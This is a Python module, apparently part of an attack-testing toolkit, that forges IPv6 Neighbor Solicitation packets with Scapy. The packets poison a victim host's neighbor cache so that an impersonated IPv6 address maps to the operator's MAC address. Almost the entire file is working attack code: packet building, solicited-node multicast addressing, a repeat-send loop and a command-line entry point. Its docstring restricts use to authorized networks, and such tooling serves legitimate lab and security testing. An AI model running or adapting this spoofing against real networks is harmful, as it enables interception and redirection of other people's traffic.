"""Neighbor Solicitation spoofing: plant a neighbor binding with a forged NS, without waiting for a reply.

A Neighbor Solicitation (NS) carries the sender's link-layer address in the Source Link-Layer
Address option (RFC 4861). A host that receives an NS from an IPv6 address records that link-layer
address for the address, and it does so without any reply. The attacker only has to send the NS.

This module sends NS messages whose IPv6 source is the address you want to impersonate, whose
Source Link-Layer Address option is the operator's MAC, whose target is the victim's own address, and
whose destination is the victim's solicited-node multicast address, with hop limit 255. The effect to measure is whether a host that
has an entry for the impersonated address replaces its link-layer address with the operator's MAC.

Intended only for networks you own or are explicitly authorized to test.

Run as a module inside the attacker's network namespace:
    ip netns exec atk python -m macabre.attacks.neighbor_solicitation_spoofing a1 --source-mac 02:00:00:00:00:30 --target 2001:db8:1::20
"""

from __future__ import annotations

import argparse
import ipaddress
import sys
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, IPv6
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

MAX_FRAMES = 100
_SOLICITED_NODE_PREFIX = int(ipaddress.IPv6Address("ff02::1:ff00:0"))


def validate_target(address: str) -> ipaddress.IPv6Address:
    try:
        parsed = ipaddress.IPv6Address(address)
    except ValueError as exc:
        raise ValueError(f"Target {address!r} is not an IPv6 address.") from exc
    if parsed.is_multicast or parsed.is_unspecified:
        raise ValueError("Target must be a unicast IPv6 address.")
    return parsed


def solicited_node(target: ipaddress.IPv6Address) -> ipaddress.IPv6Address:
    """Solicited-node multicast address of `target` (RFC 4291): ff02::1:ff00:0/104 plus the low 24 bits."""
    return ipaddress.IPv6Address(_SOLICITED_NODE_PREFIX | (int(target) & 0xFFFFFF))


def solicited_node_mac(address: ipaddress.IPv6Address) -> str:
    """Ethernet multicast MAC of an IPv6 multicast address: 33:33 plus the low 32 bits."""
    low = int(address) & 0xFFFFFFFF
    return "33:33:" + ":".join(f"{(low >> shift) & 0xFF:02x}" for shift in (24, 16, 8, 0))


@dataclass(frozen=True)
class NeighborSolicitationSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the victims
    source_mac: str                     # the MAC the victims will record for the target (required)
    target: str = ""                    # the IPv6 address to impersonate (required)
    receiver: str = ""                  # the victim's IPv6 address; empty = the target's solicited-node group
    frames: int = 3                     # NSs sent, to keep the binding in place
    dry_run: bool = False               # build NSs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if not self.target:
            raise ValueError("Target IPv6 address is required.")
        validate_target(self.target)
        if self.receiver:
            validate_target(self.receiver)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class NeighborSolicitationSpoofingStats:
    frames: int = 0
    status: str = ""


def build_solicitation(config: NeighborSolicitationSpoofingConfig) -> Packet:
    """One NS: IPv6 source and NS target = the impersonated address, Source Link-Layer Address = the operator's MAC."""
    source = normalize_unicast_mac(config.source_mac)
    target = validate_target(config.target)
    # A host records the source of an NS only when the NS asks for one of its own addresses. So with a
    # receiver, the NS asks for the receiver's address, is sent to its solicited-node group, and carries
    # the impersonated target as its IPv6 source. Without a receiver, the NS asks for the target itself.
    victim = validate_target(config.receiver) if config.receiver else target
    group = solicited_node(victim)
    return (
        Ether(src=source, dst=solicited_node_mac(group))
        / IPv6(src=str(target), dst=str(group), hlim=255)
        / ICMPv6ND_NS(tgt=str(victim))
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
    )


def run_neighbor_solicitation_spoofing(
    config: NeighborSolicitationSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[NeighborSolicitationSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> NeighborSolicitationSpoofingStats:
    """Send `frames` forged Neighbor Solicitations, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = NeighborSolicitationSpoofingStats(
            status=(
                f"Dry run: would send {config.frames} forged Neighbor Solicitation(s) binding {config.target} "
                f"to {config.source_mac}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = NeighborSolicitationSpoofingStats()
    frame = build_solicitation(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} solicitation(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Plant a neighbor binding with forged Neighbor Solicitations.")
    parser.add_argument("iface")
    parser.add_argument("--source-mac", required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--receiver", default="", help="victim IPv6 address (default: target's solicited-node)")
    parser.add_argument("--frames", type=int, default=3)
    args = parser.parse_args(argv)
    config = NeighborSolicitationSpoofingConfig(
        iface=args.iface, source_mac=args.source_mac, target=args.target,
        receiver=args.receiver, frames=args.frames,
    )
    stats = run_neighbor_solicitation_spoofing(config, threading.Event(), lambda _s: None)
    print(f"Sent {stats.frames} forged Neighbor Solicitation(s).", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
